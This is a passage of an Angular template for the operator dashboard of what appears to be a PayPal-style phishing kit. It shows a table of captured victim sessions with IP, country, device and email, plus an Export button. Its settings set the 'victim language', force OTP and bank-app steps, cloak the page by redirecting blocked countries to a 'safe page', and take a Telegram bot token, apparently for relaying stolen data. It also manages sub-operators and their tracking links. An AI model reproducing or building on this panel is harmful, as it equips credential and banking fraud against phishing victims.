                                    <button (click)="bulkDelete()" class="text-slate-500 hover:text-red-500 transition-colors" title="Delete"><span class="material-icons text-sm">delete</span></button>
                                </div>
                            }

                            <div class="flex items-center gap-2 w-full md:w-auto ml-auto">
                                <div class="relative flex-1 md:w-64">
                                    <span class="material-icons absolute left-3 top-2.5 text-slate-400 text-sm">search</span>
                                    <input type="text" [ngModel]="searchQuery()" (ngModelChange)="searchQuery.set($event)" placeholder="Search sessions..." class="w-full pl-9 pr-4 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg focus:outline-none focus:border-pp-blue transition-colors dark:bg-slate-700 dark:text-white">
                                </div>
                                <select [ngModel]="timeFilter()" (ngModelChange)="timeFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg bg-white dark:bg-slate-700 dark:text-white cursor-pointer">
                                    <option value="6h">Last 6 Hours</option>
                                    <option value="24h">Last 24 Hours</option>
                                    <option value="7d">Last 7 Days</option>
                                    <option value="all">All Time</option>
                                </select>
                            </div>
                        </div>
                        <div class="flex-1 overflow-auto bg-white dark:bg-slate-800">
                            <table class="w-full text-left border-collapse">
                                <thead class="bg-pp-bg dark:bg-slate-800 text-slate-500 dark:text-slate-400 text-xs font-bold uppercase tracking-wider sticky top-0 z-10 shadow-sm">
                                    <tr>
                                        <th class="px-4 py-4 w-12 text-center">
                                            <input type="checkbox" (change)="toggleAllSelection($event)" [checked]="isAllSelected()" class="rounded border-slate-300 text-pp-blue focus:ring-pp-blue cursor-pointer">
                                        </th>
                                        <th class="px-4 py-4">Time</th>
                                        <th class="px-4 py-4">Country</th>
                                        <th class="px-6 py-4">IP Address</th>
                                        <th class="px-4 py-4">Device</th>
                                        <th class="px-6 py-4">Identity</th>
                                        <th class="px-6 py-4">Status</th>
                                        <th class="px-6 py-4 text-right">Actions</th>
                                    </tr>
                                </thead>
                                <tbody class="divide-y divide-slate-100 dark:divide-slate-700 text-sm font-medium">
                                    @for(item of filteredHistory(); track item.id) {
                                        <tr class="hover:bg-slate-50 dark:hover:bg-slate-700 transition-colors cursor-pointer group" (click)="viewHistory(item)">
                                            <td class="px-4 py-4 text-center" (click)="$event.stopPropagation()">
                                                <input type="checkbox" [checked]="selectedSessionIds().has(item.id)" (change)="toggleSelection(item.id, $event)" class="rounded border-slate-300 dark:border-slate-500 text-pp-blue focus:ring-pp-blue cursor-pointer">
                                            </td>
                                            <td class="px-4 py-4 text-slate-500 dark:text-slate-400 whitespace-nowrap">{{ item.timestamp | date:'short' }}</td>
                                            <td class="px-4 py-4">
                                                @if(item.data?.ipCountry) {
                                                    <img [src]="getFlagUrl(item.data.ipCountry)" class="h-4 w-auto rounded shadow-sm" title="{{item.data.ipCountry}}">
                                                }
                                            </td>
                                            <td class="px-6 py-4 text-pp-blue dark:text-blue-400 font-bold font-mono">{{ item.ip || item.fingerprint.ip }}</td>
                                            <td class="px-4 py-4 text-slate-500">
                                                <span class="material-icons text-[16px]">{{ getDeviceIcon(item.fingerprint?.userAgent) }}</span>
                                            </td>
                                            <td class="px-6 py-4 dark:text-white">{{ item.email }}</td>
                                            <td class="px-6 py-4"><span class="bg-green-100 text-green-700 px-3 py-1 rounded-full text-[11px] font-bold uppercase">{{ item.status }}</span></td>
                                            <td class="px-6 py-4 text-right"><button (click)="exportTxt(item)" class="text-pp-blue font-bold text-xs hover:underline">Export</button></td>
                                        </tr>
                                    }
                                </tbody>
                            </table>
                        </div>
                    </div>
                }

                @case ('settings') {
                    <div class="bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-y-auto h-full p-8 animate-fade-in">
                         <h2 class="font-bold text-xl mb-6 text-pp-navy dark:text-white">{{ 'SYSTEM' | translate }} Configuration</h2>

                         <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">{{ 'TRAFFIC_FLOW' | translate }}</h3>
                             <div class="space-y-4">
                                 <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
                                     <div>
                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">{{ 'AUTO_APPROVE_LOGIN' | translate }}</span>
                                         <span class="text-xs text-slate-400">Automatically bypass login and go to verification</span>
                                     </div>
                                     <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
                                          [class.bg-pp-success]="flowSettings.autoApproveLogin" [class.bg-slate-200]="!flowSettings.autoApproveLogin"
                                          (click)="flowSettings.autoApproveLogin = !flowSettings.autoApproveLogin; $event.preventDefault()">
                                         <span class="pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out"
                                               [class.translate-x-5]="flowSettings.autoApproveLogin" [class.translate-x-0]="!flowSettings.autoApproveLogin"></span>
                                     </div>
                                 </label>
                                 <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
                                     <div>
                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">{{ 'SKIP_PHONE_VERIFICATION' | translate }}</span>
                                         <span class="text-xs text-slate-400">Jump directly to Personal Info</span>
                                     </div>
                                     <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
                                          [class.bg-pp-success]="flowSettings.skipPhone" [class.bg-slate-200]="!flowSettings.skipPhone"
                                          (click)="flowSettings.skipPhone = !flowSettings.skipPhone; $event.preventDefault()">
                                         <span class="pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out"
                                               [class.translate-x-5]="flowSettings.skipPhone" [class.translate-x-0]="!flowSettings.skipPhone"></span>
                                     </div>
                                 </label>
                                 <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
                                     <div>
                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">{{ 'FORCE_BANK_APP' | translate }}</span>
                                     </div>
                                     <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
                                          [class.bg-pp-success]="flowSettings.forceBankApp" [class.bg-slate-200]="!flowSettings.forceBankApp"
                                          (click)="flowSettings.forceBankApp = !flowSettings.forceBankApp; $event.preventDefault()">
                                         <span class="pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out"
                                               [class.translate-x-5]="flowSettings.forceBankApp" [class.translate-x-0]="!flowSettings.forceBankApp"></span>
                                     </div>
                                 </label>
                                 <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
                                     <div>
                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">{{ 'FORCE_OTP' | translate }}</span>
                                     </div>
                                     <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
                                          [class.bg-pp-success]="flowSettings.forceOtp" [class.bg-slate-200]="!flowSettings.forceOtp"
                                          (click)="flowSettings.forceOtp = !flowSettings.forceOtp; $event.preventDefault()">
                                         <span class="pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out"
                                               [class.translate-x-5]="flowSettings.forceOtp" [class.translate-x-0]="!flowSettings.forceOtp"></span>
                                     </div>
                                 </label>
                             </div>
                         </div>

                         <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">{{ 'GEO_BLOCKING' | translate }}</h3>

                             <div class="space-y-6">
                                 <div>
                                     <label class="block text-sm font-bold text-pp-navy dark:text-white mb-2">{{ 'ALLOWED_COUNTRIES' | translate }} (Whitelist)</label>
                                     <p class="text-xs text-slate-400 mb-2">Only users from these countries can access the page. Leave empty to allow all.</p>
                                     <div class="flex flex-wrap gap-2 mb-2">
                                         @for(c of flowSettings.allowedCountries; track c) {
                                             <span class="bg-green-100 text-green-800 text-xs font-bold px-2 py-1 rounded flex items-center gap-1">
                                                 {{ c }}
                                                 <button (click)="removeCountry('allowed', c)" class="hover:text-green-900"><span class="material-icons text-[10px]">close</span></button>
                                             </span>
                                         }
                                     </div>
                                     <div class="relative">
                                         <div class="pp-input-group mb-0 cursor-pointer" (click)="toggleAllowedDropdown()">
                                             <input type="text" [ngModel]="allowedSearch()" (ngModelChange)="allowedSearch.set($event)" placeholder="Search to add..." class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
                                             <span class="material-icons absolute right-3 top-3 text-slate-400">add</span>
                                         </div>
                                         @if(showAllowedDropdown()) {
                                             <div class="absolute w-full bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-600 rounded-lg shadow-xl mt-1 z-50 max-h-48 overflow-y-auto">
                                                 @for(c of filteredAllowedCountries(); track c.code) {
                                                     <div (click)="selectCountryToAdd('allowed', c.code)" class="px-4 py-2 hover:bg-slate-50 dark:hover:bg-slate-700 cursor-pointer text-sm dark:text-white">
                                                         {{ c.name }} ({{c.code}})
                                                     </div>
                                                 }
                                             </div>
                                         }
                                     </div>
                                 </div>

                                 <div>
                                     <label class="block text-sm font-bold text-pp-navy dark:text-white mb-2">{{ 'BLOCKED_COUNTRIES' | translate }} (Blacklist)</label>
                                     <p class="text-xs text-slate-400 mb-2">Users from these countries will be redirected to the safe page.</p>
                                     <div class="flex flex-wrap gap-2 mb-2">
                                         @for(c of flowSettings.blockedCountries; track c) {
                                             <span class="bg-red-100 text-red-800 text-xs font-bold px-2 py-1 rounded flex items-center gap-1">
                                                 {{ c }}
                                                 <button (click)="removeCountry('blocked', c)" class="hover:text-red-900"><span class="material-icons text-[10px]">close</span></button>
                                             </span>
                                         }
                                     </div>
                                     <div class="relative">
                                         <div class="pp-input-group mb-0 cursor-pointer" (click)="toggleBlockedDropdown()">
                                             <input type="text" [ngModel]="blockedSearch()" (ngModelChange)="blockedSearch.set($event)" placeholder="Search to add..." class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
                                             <span class="material-icons absolute right-3 top-3 text-slate-400">add</span>
                                         </div>
                                         @if(showBlockedDropdown()) {
                                             <div class="absolute w-full bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-600 rounded-lg shadow-xl mt-1 z-50 max-h-48 overflow-y-auto">
                                                 @for(c of filteredBlockedCountries(); track c.code) {
                                                     <div (click)="selectCountryToAdd('blocked', c.code)" class="px-4 py-2 hover:bg-slate-50 dark:hover:bg-slate-700 cursor-pointer text-sm dark:text-white">
                                                         {{ c.name }} ({{c.code}})
                                                     </div>
                                                 }
                                             </div>
                                         }
                                     </div>
                                 </div>

                                 <div>
                                     <label class="block text-sm font-bold text-pp-navy dark:text-white mb-2">{{ 'VICTIM_LANGUAGE' | translate }}</label>
                                     <select [(ngModel)]="flowSettings.defaultLang" class="pp-input dark:bg-slate-700 dark:text-white dark:border-slate-600">
                                         <option *ngFor="let l of languageList" [value]="l.code">{{ l.name }}</option>
                                     </select>
                                 </div>

                                 <button (click)="saveSettings()" class="pp-btn mt-4">{{ 'SAVE_API_SETTINGS' | translate }}</button>
                             </div>
                         </div>

                         <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">{{ 'APPEARANCE' | translate }}</h3>

                             <div class="flex items-center justify-between mb-4">
                                 <div class="flex items-center gap-3">
                                     <div class="p-2 rounded-full bg-slate-100 dark:bg-slate-700 text-slate-600 dark:text-slate-300">
                                         <span class="material-icons">translate</span>
                                     </div>
                                     <div>
                                         <p class="font-bold text-pp-navy dark:text-white">{{ 'DASHBOARD_LANGUAGE' | translate }}</p>
                                     </div>
                                 </div>
                                 <select [(ngModel)]="currentAdminLang" (change)="changeAdminLanguage(currentAdminLang)" class="px-3 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg bg-white dark:bg-slate-700 dark:text-white focus:outline-none focus:border-pp-blue cursor-pointer">
                                     <option *ngFor="let l of languageList" [value]="l.code">{{ l.name }}</option>
                                 </select>
                             </div>

                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-3">
                                     <div class="p-2 rounded-full bg-slate-100 dark:bg-slate-700 text-slate-600 dark:text-slate-300">
                                         <span class="material-icons">{{ isDarkMode() ? 'dark_mode' : 'light_mode' }}</span>
                                     </div>
                                     <div>
                                         <p class="font-bold text-pp-navy dark:text-white">{{ 'DARK_MODE' | translate }}</p>
                                     </div>
                                 </div>
                                 <button (click)="toggleDarkMode()" class="relative inline-flex h-6 w-11 items-center rounded-full transition-colors focus:outline-none"
                                         [class.bg-pp-blue]="isDarkMode()" [class.bg-slate-200]="!isDarkMode()">
                                     <span class="inline-block h-4 w-4 transform rounded-full bg-white transition-transform"
                                           [class.translate-x-6]="isDarkMode()" [class.translate-x-1]="!isDarkMode()"></span>
                                 </button>
                             </div>
                         </div>

                         <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">{{ 'TELEGRAM_INTEGRATION' | translate }}</h3>
                             @if(!isSettingsConfigured()) {
                                 <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                    <div class="pp-input-group mb-0">
                                        <input type="text" [(ngModel)]="tgToken" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
                                        <label class="pp-label dark:bg-slate-700 dark:text-slate-400">{{ 'BOT_TOKEN' | translate }}</label>
                                    </div>
                                    <div class="pp-input-group mb-0">
                                        <input type="text" [(ngModel)]="tgChat" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
                                        <label class="pp-label dark:bg-slate-700 dark:text-slate-400">{{ 'CHAT_ID' | translate }}</label>
                                    </div>
                                 </div>
                                 <div class="mt-4">
                                     <button (click)="saveSettings()" class="pp-btn">{{ 'SAVE_API_SETTINGS' | translate }}</button>
                                 </div>
                             } @else {
                                 <div class="bg-slate-50 dark:bg-slate-700/50 p-6 rounded-xl border border-slate-200 dark:border-slate-600">
                                     <div class="flex items-center gap-4 mb-4">
                                         <div class="w-12 h-12 rounded-full bg-blue-100 dark:bg-blue-900/30 flex items-center justify-center text-pp-blue">
                                             <span class="material-icons">telegram</span>
                                         </div>
                                         <div>
                                             <h4 class="font-bold text-pp-navy dark:text-white">{{ 'BOT_CONFIGURED' | translate }}</h4>
                                         </div>
                                     </div>
                                     <button (click)="deleteSettings()" class="flex items-center justify-center gap-2 w-full py-3 rounded-lg font-bold text-red-600 hover:bg-red-50 dark:hover:bg-red-900/20 transition-colors border border-transparent hover:border-red-100">
                                         <span class="material-icons text-sm">delete</span> {{ 'REMOVE_CREDENTIALS' | translate }}
                                     </button>
                                 </div>
                             }
                         </div>

                         <div>
                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">{{ 'ADMIN_SECURITY' | translate }}</h3>
                             <div class="space-y-4">
                                 <div class="pp-input-group mb-0">
                                     <input type="password" [(ngModel)]="settingOldPass" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
                                     <label class="pp-label dark:bg-slate-700 dark:text-slate-400">{{ 'CURRENT_PASSWORD' | translate }}</label>
                                 </div>
                                 <div class="pp-input-group mb-0">
                                     <input type="password" [(ngModel)]="settingNewPass" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
                                     <label class="pp-label dark:bg-slate-700 dark:text-slate-400">{{ 'NEW_PASSWORD' | translate }}</label>
                                 </div>
                                 <button (click)="changePassword()" class="pp-btn bg-slate-800 hover:bg-slate-900 dark:bg-slate-600 dark:hover:bg-slate-500">
                                     {{ 'UPDATE_PASSWORD' | translate }}
                                 </button>
                             </div>
                         </div>

                    </div>
                }
            }
         </div>
      </main>

      @if (userPanelOpen()) {
           <div class="fixed inset-0 z-50 flex justify-end">
               <div class="absolute inset-0 bg-black/20 backdrop-blur-sm transition-opacity" (click)="closeUserPanel()"></div>
               <div class="relative w-full max-w-[500px] bg-white dark:bg-slate-800 h-full shadow-2xl flex flex-col animate-slide-in-right">
                   <div class="p-6 border-b border-slate-100 dark:border-slate-700 flex justify-between items-center bg-slate-50/50 dark:bg-slate-800/95">
                       <div>
                           <h2 class="font-bold text-xl text-pp-navy dark:text-white">{{ selectedAdmin()?.username }}</h2>
                           <p class="text-xs text-slate-500 uppercase">{{ selectedAdmin()?.role }} • {{ selectedAdmin()?.uniqueCode }}</p>
                       </div>
                       <button (click)="closeUserPanel()" class="p-2 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-500 dark:text-slate-400 rounded-full transition-colors">
                           <span class="material-icons">close</span>
                       </button>
                   </div>

                   <div class="flex-1 overflow-y-auto p-6 space-y-8">
                       @if(selectedAdmin()?.id !== auth.currentUser()?.id) {
                           <div class="grid grid-cols-2 gap-4">
                               <button (click)="impersonateUser(selectedAdmin())" class="bg-pp-navy text-white py-3 rounded-lg font-bold text-sm hover:bg-pp-blue transition-colors flex items-center justify-center gap-2 shadow-lg">
                                   <span class="material-icons text-sm">login</span> Impersonate
                               </button>
                               <button (click)="resetUserPassword(selectedAdmin())" class="bg-slate-100 dark:bg-slate-700 text-slate-700 dark:text-slate-200 py-3 rounded-lg font-bold text-sm hover:bg-slate-200 dark:hover:bg-slate-600 transition-colors">
                                   Reset Password
                               </button>
                           </div>
                       }

                       <div>
                           <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4 border-b border-slate-100 dark:border-slate-700 pb-2">Tracking Links</h3>
                           <div class="space-y-2">
                               @for(link of selectedAdminLinks(); track link.code) {
                                   <div class="flex items-center justify-between p-3 bg-slate-50 dark:bg-slate-700/30 rounded-lg border border-slate-100 dark:border-slate-700">
                                       <div class="flex flex-col">
                                           <span class="font-mono font-bold text-pp-blue text-sm">{{ link.code }}</span>
                                           <span class="text-[10px] text-slate-400">{{ link.clicks }} clicks • {{ link.sessions_verified }} verified</span>
                                       </div>
                                       <button (click)="copy(getLinkUrl(link.code))" class="text-slate-400 hover:text-pp-navy"><span class="material-icons text-sm">content_copy</span></button>
                                   </div>
                               }
                               @if(selectedAdminLinks().length === 0) {
                                   <p class="text-xs text-slate-400 italic">No links found.</p>
                               }
                           </div>
                       </div>

                       <div>
                           <div class="flex justify-between items-center mb-4 border-b border-slate-100 dark:border-slate-700 pb-2">
                               <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider">Flow Control</h3>
                               <button (click)="saveAdminSettings()" class="text-xs font-bold bg-green-600 text-white px-3 py-1 rounded hover:bg-green-700 transition-colors">Save</button>
                           </div>

                           @if(selectedAdminSettings) {
                               <div class="space-y-3">
                                   <label class="flex items-center justify-between p-3 rounded-lg border border-slate-200 dark:border-slate-700 bg-white dark:bg-slate-800/50">
                                       <span class="text-sm font-bold text-pp-navy dark:text-white">Auto-Approve Login</span>
                                       <input type="checkbox" [(ngModel)]="selectedAdminSettings.autoApproveLogin" class="w-5 h-5 text-pp-blue rounded focus:ring-pp-blue border-gray-300">
                                   </label>
                                   <label class="flex items-center justify-between p-3 rounded-lg border border-slate-200 dark:border-slate-700 bg-white dark:bg-slate-800/50">
                                       <span class="text-sm font-bold text-pp-navy dark:text-white">Skip Phone Verification</span>
                                       <input type="checkbox" [(ngModel)]="selectedAdminSettings.skipPhone" class="w-5 h-5 text-pp-blue rounded focus:ring-pp-blue border-gray-300">
                                   </label>

                                   <div class="pt-4 border-t border-slate-100 dark:border-slate-700">
                                       <label class="block text-xs font-bold text-slate-400 uppercase mb-2">Geo-Blocking (Whitelist)</label>
                                       <div class="flex flex-wrap gap-1 mb-2">
                                           @for(c of selectedAdminSettings.allowedCountries; track c) {
                                               <span class="bg-green-100 text-green-800 text-[10px] px-1.5 py-0.5 rounded flex items-center gap-1">{{ c }} <span (click)="removeCountryFromAdmin('allowed', c)" class="cursor-pointer">×</span></span>
                                           }
                                       </div>
                                       <div class="flex gap-2">
                                            <select #userAllowSelect class="pp-input py-1 text-xs dark:bg-slate-700 dark:text-white">
                                                <option *ngFor="let c of countryList" [value]="c.code">{{ c.name }}</option>
                                            </select>
                                            <button (click)="addCountryToAdmin('allowed', userAllowSelect.value)" class="px-2 py-1 bg-slate-200 dark:bg-slate-600 text-xs rounded font-bold">Add</button>
                                       </div>
                                   </div>

                                   <div class="mt-4 pt-4 border-t border-slate-100 dark:border-slate-700">
                                       <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Max Links</label>
                                       <input type="number" [(ngModel)]="selectedAdmin().maxLinks" class="w-full p-2 text-sm border border-slate-200 dark:border-slate-600 rounded bg-slate-50 dark:bg-slate-700 dark:text-white">
                                   </div>

                                   <div class="mt-4">
                                       <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Account Status</label>
                                       <button (click)="toggleSuspension(selectedAdmin())" class="w-full py-2 rounded text-sm font-bold border transition-colors"
                                               [class.bg-red-50]="!selectedAdmin().isSuspended" [class.text-red-600]="!selectedAdmin().isSuspended" [class.border-red-100]="!selectedAdmin().isSuspended"
                                               [class.bg-green-50]="selectedAdmin().isSuspended" [class.text-green-600]="selectedAdmin().isSuspended" [class.border-green-100]="selectedAdmin().isSuspended">
                                           {{ selectedAdmin().isSuspended ? 'Unsuspend Account' : 'Suspend Account' }}
                                       </button>
                                   </div>
                               </div>
                           }
                       </div>

                       <div class="pt-8 mt-auto">
                           <button (click)="deleteUser(selectedAdmin())" class="w-full py-3 rounded-lg font-bold text-red-600 hover:bg-red-50 border border-transparent hover:border-red-100 transition-colors flex items-center justify-center gap-2">
                               <span class="material-icons text-sm">delete_forever</span> Delete Admin Account
                           </button>
                       </div>
                   </div>
               </div>
           </div>
      }

      @if (userModalOpen()) {
           <div class="fixed inset-0 z-50 flex items-center justify-center p-4">
               <div class="absolute inset-0 bg-black/40 backdrop-blur-sm transition-opacity" (click)="closeUserModal()"></div>
               <div class="relative bg-white dark:bg-slate-800 rounded-2xl shadow-2xl max-w-md w-full overflow-hidden animate-fade-in">
                   <div class="p-6 border-b border-slate-100 dark:border-slate-700 bg-slate-50 dark:bg-slate-900/50 flex justify-between items-center">
                       <h3 class="font-bold text-lg text-pp-navy dark:text-white">Create Admin User</h3>
                       <button (click)="closeUserModal()" class="text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 transition-colors">
                           <span class="material-icons">close</span>
                       </button>
                   </div>
                   <div class="p-6 space-y-4">
                       <div class="pp-input-group mb-0">
                           <input type="text" [(ngModel)]="newUser.username" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
                           <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Username</label>
                       </div>
                       <div class="pp-input-group mb-0">
                           <input type="password" [(ngModel)]="newUser.password" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
                           <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Password</label>
                       </div>
                       <div class="grid grid-cols-2 gap-4">
                           <div class="pp-input-group mb-0">
                               <select [(ngModel)]="newUser.role" class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
                                   <option value="admin">Admin</option>
                                   <option value="hypervisor">Hypervisor</option>
                               </select>
                               <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Role</label>
                           </div>
                           <div class="pp-input-group mb-0">
                               <input type="number" [(ngModel)]="newUser.maxLinks" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
                               <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Max Links</label>
                           </div>
                       </div>
                       <div class="pt-4 border-t border-slate-100 dark:border-slate-700">
                           <p class="text-xs font-bold text-slate-400 uppercase mb-3">Default Flow Settings</p>
                           <div class="space-y-2">
                               <label class="flex items-center gap-2 cursor-pointer">
                                   <input type="checkbox" [(ngModel)]="newUser.flow.autoApproveLogin" class="rounded text-pp-blue focus:ring-pp-blue border-slate-300">
                                   <span class="text-sm text-pp-navy dark:text-white">Auto-Approve Login</span>
                               </label>
                               <label class="flex items-center gap-2 cursor-pointer">
                                   <input type="checkbox" [(ngModel)]="newUser.flow.skipPhone" class="rounded text-pp-blue focus:ring-pp-blue border-slate-300">
                                   <span class="text-sm text-pp-navy dark:text-white">Skip Phone Verification</span>
                               </label>
                               <label class="flex items-center gap-2 cursor-pointer">
                                   <input type="checkbox" [(ngModel)]="newUser.flow.forceBankApp" class="rounded text-pp-blue focus:ring-pp-blue border-slate-300">
                                   <span class="text-sm text-pp-navy dark:text-white">Force Bank App</span>
                               </label>
                           </div>
                       </div>
                   </div>
                   <div class="p-4 border-t border-slate-100 dark:border-slate-700 bg-slate-50 dark:bg-slate-900/50 flex justify-end gap-3">
                       <button (click)="closeUserModal()" class="px-4 py-2 text-slate-500 font-bold hover:bg-slate-200 dark:hover:bg-slate-700 rounded-lg transition-colors text-sm">Cancel</button>
                       <button (click)="submitCreateUser()" class="pp-btn w-auto px-6 py-2 text-sm">Create User</button>
                   </div>
               </div>
           </div>
      }

      @if (assignModalOpen()) {
           <div class="fixed inset-0 z-50 flex items-center justify-center p-4">
               <div class="absolute inset-0 bg-black/40 backdrop-blur-sm transition-opacity" (click)="assignModalOpen.set(false)"></div>
               <div class="relative bg-white dark:bg-slate-800 rounded-2xl shadow-2xl max-w-md w-full overflow-hidden animate-fade-in">
                   <div class="p-6 border-b border-slate-100 dark:border-slate-700 bg-slate-50 dark:bg-slate-900/50 flex justify-between items-center">
                       <h3 class="font-bold text-lg text-pp-navy dark:text-white">Assign Session</h3>
                       <button (click)="assignModalOpen.set(false)" class="text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 transition-colors">
                           <span class="material-icons">close</span>
                       </button>
                   </div>
                   <div class="p-6 space-y-4">
                       <div class="pp-input-group mb-0 relative">
                           <span class="material-icons absolute right-3 top-3 text-slate-400">search</span>
                           <input type="text" [ngModel]="assignSearch()" (ngModelChange)="assignSearch.set($event)" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
                           <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Search Admin</label>
                       </div>

                       <div class="max-h-[300px] overflow-y-auto space-y-2">
                           @for(admin of filteredAdmins(); track admin.id) {
                               <div class="flex items-center justify-between p-3 rounded-lg border border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
                                   <div>
                                       <p class="font-bold text-sm text-pp-navy dark:text-white">{{ admin.username }}</p>
                                       <p class="text-[10px] text-slate-400 uppercase">{{ admin.role }}</p>
                                   </div>
                                   <button (click)="submitAssignment(admin.id)" class="text-xs font-bold bg-pp-blue text-white px-3 py-1.5 rounded hover:bg-[#005ea6] transition-colors">
                                       Select
                                   </button>
                               </div>
                           }
                           @if(filteredAdmins().length === 0) {
                               <p class="text-center text-sm text-slate-400 py-4">No admins found.</p>
                           }
                       </div>
                   </div>
               </div>
           </div>
      }

      @if (historyPanelOpen()) {
           <div class="fixed inset-0 z-50 flex justify-end">
               <div class="absolute inset-0 bg-black/20 backdrop-blur-sm transition-opacity" (click)="closeHistory()"></div>
               <div class="relative w-full max-w-[90vw] md:max-w-[1200px] bg-white dark:bg-slate-800 h-full shadow-2xl flex flex-col animate-slide-in-right">
                   <div class="p-6 border-b border-slate-100 dark:border-slate-700 flex justify-between items-center bg-slate-50/50 dark:bg-slate-800/95">
                       <h2 class="font-bold text-xl text-pp-navy dark:text-white">Session History Details</h2>
                       <button (click)="closeHistory()" class="p-2 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-500 dark:text-slate-400 rounded-full transition-colors">
                           <span class="material-icons">close</span>
                       </button>
                   </div>
                   <div class="flex-1 overflow-y-auto bg-[#F9FAFB] dark:bg-slate-900 flex flex-col">
                        <ng-container *ngTemplateOutlet="sessionDetailView; context: {session: selectedHistorySession(), isHistory: true}"></ng-container>
                   </div>
               </div>
           </div>
      }

      <ng-template #sessionDetailView let-session="session" let-isHistory="isHistory">
            <div class="p-6 border-b border-slate-100 dark:border-slate-700 flex justify-between items-center bg-white/50 dark:bg-slate-800/90 shrink-0">
                <div>
                    <div class="flex items-center gap-3 mb-1">
                    <h2 class="font-bold text-xl text-pp-navy dark:text-white">{{ 'SESSION_DETAILS' | translate }}</h2>
                    <span class="bg-pp-navy text-white text-[10px] px-2 py-0.5 rounded uppercase tracking-wider font-bold">{{ session?.stage }}</span>
                    </div>
                    <div class="flex items-center gap-2">
                        @if(getDeviceImage(session?.fingerprint?.userAgent)) {
                             <img [src]="getDeviceImage(session?.fingerprint?.userAgent)" class="h-4 w-4 object-contain dark:invert opacity-70">
                        } @else {
                             <span class="material-icons text-slate-400 text-[14px]">{{ getDeviceIcon(session?.fingerprint?.userAgent) }}</span>
                        }
                        <p class="text-xs text-slate-500 dark:text-slate-400 font-mono">{{ session?.ip || session?.fingerprint?.ip }} • {{ session?.id }}</p>
                    </div>
                </div>
                @if(!isHistory) {
                    <div class="text-right flex flex-col items-end">
                        <p class="text-[10px] text-slate-400 font-bold uppercase">{{ 'TIME_ELAPSED' | translate }}</p>
                        <div class="flex items-center gap-2">
                            <p class="font-mono font-bold text-pp-blue">{{ elapsedTime() }}</p>
                            <button (click)="extendTimeout(60000)" class="text-[10px] bg-blue-50 text-pp-blue px-2 py-0.5 rounded hover:bg-blue-100 font-bold border border-blue-100 transition-colors" title="Add 1 Minute">+1m</button>
                        </div>
                    </div>
                }
            </div>

